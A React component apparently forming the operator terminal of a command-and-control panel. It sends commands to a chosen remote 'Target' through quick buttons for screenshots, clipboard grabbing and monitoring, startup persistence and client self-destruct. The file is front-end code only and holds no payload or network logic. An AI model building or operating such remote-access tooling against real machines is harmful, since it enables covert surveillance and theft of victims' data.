import { useRef, useEffect } from 'react';
import { Send } from 'lucide-react';
import type { Client } from '../types';
import Tooltip from './Tooltip';

interface TerminalProps {
  clients: Client[];
  selectedClientId: string;
  termLogs: string[];
  termInput: string;
  setTermInput: (v: string) => void;
  suggestions: string[];
  setSuggestions: (s: string[]) => void;
  executeCommand: (cmd: string, silent?: boolean) => void;
  handleInputChange: (val: string) => void;
}

const QUICK_COMMANDS = [
  { label: 'sysinfo', cmd: 'sysinfo', tip: 'System information' },
  { label: 'screenshot', cmd: 'screenshot', tip: 'Capture remote screen' },
  { label: 'ps', cmd: 'ps', tip: 'List running processes' },
  { label: 'clip', cmd: 'clip', tip: 'Grab clipboard' },
  { label: 'clipwatch', cmd: 'clipwatch', tip: 'Start clipboard monitor' },
  { label: 'clipstop', cmd: 'clipstop', tip: 'Stop clipboard monitor' },
  { label: 'persist', cmd: 'persist', tip: 'Apply startup persistence' },
  { label: 'kill', cmd: 'kill', tip: 'Self-destruct client' },
];

export default function Terminal({
  clients, selectedClientId, termLogs, termInput, setTermInput,
  suggestions, setSuggestions, executeCommand, handleInputChange
}: TerminalProps) {
  const scrollRef = useRef<HTMLDivElement>(null);

  // Auto-scroll terminal output
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [termLogs]);

  const targetDisplay = selectedClientId && clients.some(c => c.id === selectedClientId)
    ? selectedClientId
    : (clients.length > 0 ? clients[0].id : 'None Selected');

  return (
    <div className="h-full flex flex-col space-y-4">
      {/* Target header */}
      <div className="bg-c2card border border-c2border p-3 rounded flex items-center justify-between">
        <span className="text-xs font-mono text-c2accent">
          Target: {targetDisplay}
        </span>
        <span className="text-xs text-slate-400">Interactive C2 Shell</span>
      </div>

      {/* Output log */}
      <div
        ref={scrollRef}
        className="flex-1 bg-slate-950 border border-c2border rounded p-4 font-mono text-[11px] overflow-y-auto space-y-1 shadow-inner scrollbar-thin scrollbar-thumb-c2border scrollbar-track-transparent"
      >
        {termLogs.map((log, i) => (
          <div
            key={i}
            className={`whitespace-pre-wrap break-all leading-relaxed ${
              log.startsWith('>') ? 'text-c2accent font-bold mt-2' :
              log.startsWith('[+]') ? 'text-emerald-400 mt-1' :
              'text-slate-300 pl-4 border-l border-slate-800 ml-1 py-1'
            }`}
          >
            {log}
          </div>
        ))}
      </div>

      {/* Quick command buttons */}
      <div className="flex items-center space-x-2 overflow-x-auto pb-1">
        {QUICK_COMMANDS.map((item) => (
          <Tooltip key={item.label} text={item.tip} position="top">
            <button
              onClick={() => executeCommand(item.cmd)}
              className="px-2.5 py-1 bg-c2card border border-c2border rounded text-xs font-mono hover:bg-c2accent hover:text-slate-950 transition-colors whitespace-nowrap"
            >
              {item.label}
            </button>
          </Tooltip>
        ))}
      </div>

      {/* Input row */}
      <div className="relative">
        {suggestions.length > 0 && (
          <div className="absolute bottom-full mb-1 left-0 w-full bg-c2card border border-c2border rounded shadow-lg overflow-hidden z-10">
            {suggestions.map((sug, i) => (
              <div
                key={i}
                onClick={() => { setTermInput(sug); setSuggestions([]); }}
                className="px-3 py-2 text-xs font-mono hover:bg-c2accent hover:text-slate-950 cursor-pointer border-b border-c2border/50 last:border-0"
              >
                {sug}
              </div>
            ))}
          </div>
        )}
        <div className="flex space-x-2">
          <input
            type="text"
            value={termInput}
            onChange={(e) => handleInputChange(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && executeCommand(termInput)}
            placeholder="Enter command..."
            className="flex-1 bg-c2card border border-c2border rounded px-4 py-2.5 text-sm font-mono focus:outline-none focus:border-c2accent"
          />
          <Tooltip text="Send command to remote machine" position="top">
            <button
              onClick={() => executeCommand(termInput)}
              className="px-5 py-2.5 bg-c2accent text-slate-950 font-semibold rounded hover:bg-blue-500 transition-colors flex items-center space-x-2"
            >
              <Send className="w-4 h-4" />
              <span>Execute</span>
            </button>
          </Tooltip>
        </div>
      </div>
    </div>
  );
}
